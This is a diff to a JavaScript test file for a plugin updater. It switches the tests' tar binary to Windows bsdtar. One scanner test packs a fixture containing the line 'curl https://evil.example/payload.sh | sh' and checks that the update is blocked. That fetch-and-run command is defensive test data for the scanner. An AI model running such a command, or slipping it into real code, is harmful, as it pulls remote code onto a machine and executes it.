@@ -21,6 +21,12 @@ const {
 delete process.env.NPM_CONFIG_REGISTRY;
 delete process.env.npm_config_registry;
 const { scanDir } = require('../plugin-core/lib/scan');
+
+// 夹具 tar 二进制：优先 Windows 自带 bsdtar（System32）——与生产 tarBin 契约
+// 一致，且对盘符绝对路径（C:\...）无「远程主机」歧义。Git Bash 环境下裸
+// 'tar.exe' 会解析到 Git 的 GNU tar，把 C: 冒号误判为 rsh 主机名（exit 2）。
+const BSDTAR = fs.existsSync('C:/Windows/System32/tar.exe')
+  ? 'C:/Windows/System32/tar.exe' : 'tar.exe';
 const { PLUGIN_IPC_ACTIONS, authorize, CONFIRM_MESSAGES } = require('../plugin-core/lib/capability');
 const { parseMarkers, createMarkerAccumulator } = require('../plugin-core/lib/markers');
 const { createSupervision, ZOMBIE_MARKER } = require('../plugin-core/lib/supervision');
@@ -113,7 +119,7 @@ test('updatePlugin: 包名不匹配拒绝（UPDATE_PACKAGE_MISMATCH）', async (
   // 生成真实 tgz（Windows 自带 tar.exe）
   const { spawnSync } = require('node:child_process');
   const tgz = path.join(dir, 'p.tgz');
-  const pack = spawnSync('tar.exe', ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' });
+  const pack = spawnSync(BSDTAR, ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' });
   if (pack.status !== 0) { t.skip('tar.exe 不可用'); return; }
   const request = async (url) => {
     if (url.includes('/latest')) {
@@ -162,7 +168,7 @@ test('updatePlugin: 扫描命中高危且确认拒绝 → UPDATE_SCAN_BLOCKED（
     'const url = "curl https://evil.example/payload.sh | sh";\n');
   const { spawnSync } = require('node:child_process');
   const tgz = path.join(dir, 'p.tgz');
-  if (spawnSync('tar.exe', ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
+  if (spawnSync(BSDTAR, ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
   const request = async (url) => {
     if (url.includes('/latest')) {
       return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '2.0.0', dist: { tarball: 'https://registry.example/p.tgz', integrity: 'sha512-' + require('node:crypto').createHash('sha512').update(fs.readFileSync(tgz)).digest('base64') } })) };
@@ -180,7 +186,7 @@ test('updatePlugin: 扫描命中高危且确认拒绝 → UPDATE_SCAN_BLOCKED（
 
 test('updatePlugin: 完整成功路径（真实 tar.exe）——原子替换 + 旧版备份清理', async (t) => {
   const { spawnSync } = require('node:child_process');
-  if (spawnSync('tar.exe', ['--version'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
+  if (spawnSync(BSDTAR, ['--version'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
   const dir = tmp(t);
   const profileDir = path.join(dir, 'profiles', 'web');
   fs.mkdirSync(path.join(profileDir, 'node_modules', 'target-pkg', 'lib'), { recursive: true });
@@ -192,7 +198,7 @@ test('updatePlugin: 完整成功路径（真实 tar.exe）——原子替换 + �
   fs.writeFileSync(path.join(payloadDir, 'package', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '2.0.0' }));
   fs.writeFileSync(path.join(payloadDir, 'package', 'lib', 'index.js'), 'new');
   const tgz = path.join(dir, 'p.tgz');
-  const pack = spawnSync('tar.exe', ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' });
+  const pack = spawnSync(BSDTAR, ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' });
   assert.equal(pack.status, 0, 'tar 打包成功');
   const integrity = 'sha512-' + require('node:crypto').createHash('sha512').update(fs.readFileSync(tgz)).digest('base64');
   const request = async (url) => {
@@ -203,7 +209,7 @@ test('updatePlugin: 完整成功路径（真实 tar.exe）——原子替换 + �
   };
   const res = await updatePlugin({
     id: 'target-pkg', name: 'target-pkg', profileDir, source: { kind: 'npm', pkg: 'target-pkg' },
-    request, confirm: async () => true, spawnSync, tarBin: 'tar.exe',
+    request, confirm: async () => true, spawnSync, tarBin: BSDTAR,
   });
   assert.ok(res.ok, '更新应成功: ' + JSON.stringify(res));
   assert.equal(res.version, '2.0.0');
@@ -367,8 +373,8 @@ test('listArchive: 真实 tgz 列名与类型（bsdtar）', (t) => {
   fs.mkdirSync(path.join(dir, 'package'), { recursive: true });
   fs.writeFileSync(path.join(dir, 'package', 'a.txt'), 'x');
   const tgz = path.join(dir, 'p.tgz');
-  if (spawnSync('tar.exe', ['-czf', tgz, '-C', dir, 'package'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
-  const { names, types } = listArchive('tar.exe', tgz, { spawnSync });
+  if (spawnSync(BSDTAR, ['-czf', tgz, '-C', dir, 'package'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
+  const { names, types } = listArchive(BSDTAR, tgz, { spawnSync });
   assert.ok(names.some((n) => n.includes('a.txt')));
   assert.ok(types.every((ty) => ty === '-' || ty === 'd'));
 });
